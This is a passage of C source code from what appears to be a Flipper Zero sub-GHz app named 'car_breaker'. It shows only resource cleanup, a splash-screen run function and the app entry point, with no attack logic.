    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);

    subghz_worker_free(app->worker);
    furi_mutex_free(app->lock);

    free(app);
}

static void car_breaker_run(CarBreakerApp* app) {
    car_breaker_safe_switch_view(app, CarBreakerViewSplash);
    view_dispatcher_run(app->view_dispatcher);
}

int32_t car_breaker19_app(void* arg) {
    UNUSED(arg);
    CarBreakerApp* app = car_breaker_alloc();
    car_breaker_run(app);
    car_breaker_free(app);
    return 0;
}
